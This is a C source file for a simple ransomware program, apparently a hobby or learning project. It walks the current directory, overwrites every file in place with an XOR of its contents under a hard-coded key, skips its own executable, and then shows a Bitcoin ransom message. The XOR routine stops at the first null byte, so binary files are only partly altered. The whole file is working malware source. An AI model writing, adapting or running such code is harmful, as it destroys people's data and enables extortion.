#include <dirent.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void encryptDecrypt(unsigned char *input, const char *key) {
  // loop through the input chars
  for (size_t i = 0; input[i] != '\0'; ++i) {
    input[i] ^= key[i % strlen(key)]; // we XORing that thing with our key
  }
}

void showPopupMessage() {
#ifdef _WIN32
  system("cmd.exe /c echo Your files have been encrypted! To decrypt them, "
         "send xxx BTC to xxx!");
#else
  printf("Your files have been encrypted! To decrypt them, send xxx BTC to "
         "xxx!\n");
#endif
}

int main(int argc, char *argv[]) {
  // struct pointer to dirent header file
  struct dirent *entryPoint;
  // Directory pointer
  DIR *directoryPointer;

  // Directory path (. = current directory)
  const char *directoryPath = ".";
  // our masterkey
  const char *masterKey = "simplekey";

  // get path of executable
  char executablePath[PATH_MAX];
  realpath(argv[0], executablePath);

  directoryPointer = opendir(directoryPath);
  if (directoryPointer == NULL) {
    printf("Failed to open directory : %s\n", directoryPath);
    return EXIT_FAILURE;
  }

  while ((entryPoint = readdir(directoryPointer)) != NULL) {
    // print all entries
    printf("Processing file: %s\n", entryPoint->d_name);

    char *filePath = malloc(strlen(directoryPath) + strlen(entryPoint->d_name) +
                            2); // idek what i cooked here

    if (filePath == NULL) {
      printf("Failed to allocate filePath.\n");
      continue;
    }

    sprintf(filePath, "%s/%s", directoryPath, entryPoint->d_name);

    // ignore main executable
    if (strcmp(filePath, executablePath) == 0) {
      printf("Skipping ransomware executable: %s\n", filePath);
      free(filePath);
      continue;
    }

    // we open tha file
    FILE *filePointer =
        fopen(filePath,
              "rb+"); // rb for nissan rb engine (no its for read binary lol)
    if (filePointer == NULL) {
      printf("Unable to open file: %s\n", filePath);
      free(filePath);
      continue;
    }

    // get file size
    fseek(filePointer, 0, SEEK_END);
    long fileSize = ftell(filePointer);
    fseek(filePointer, 0, SEEK_SET);

    // allocate memory for fileContents
    unsigned char *fileContent = malloc(fileSize + 1);
    if (fileContent == NULL) {
      printf("Failed to allocate fileContent.\n");
      fclose(filePointer);
      free(filePath);
      free(fileContent);
      continue;
    }

    printf("Encrypting File: %s\n", filePath);

    // read the files and put it in the buffer
    fread(fileContent, 1, fileSize, filePointer);
    fileContent[fileSize] = '\0'; // null terminator

    // call encrypt/decrypt function
    encryptDecrypt(fileContent, masterKey);

    // write to file
    rewind(filePointer);
    fwrite(fileContent, 1, fileSize, filePointer);

    // close the file
    fclose(filePointer);
    printf("Finished processing file: %s\n", entryPoint->d_name);

    // memory cleanup
    free(fileContent);
    free(filePath);
  }

  // we done
  closedir(directoryPointer);

  // Simple popup
  showPopupMessage();

  return EXIT_SUCCESS;
}
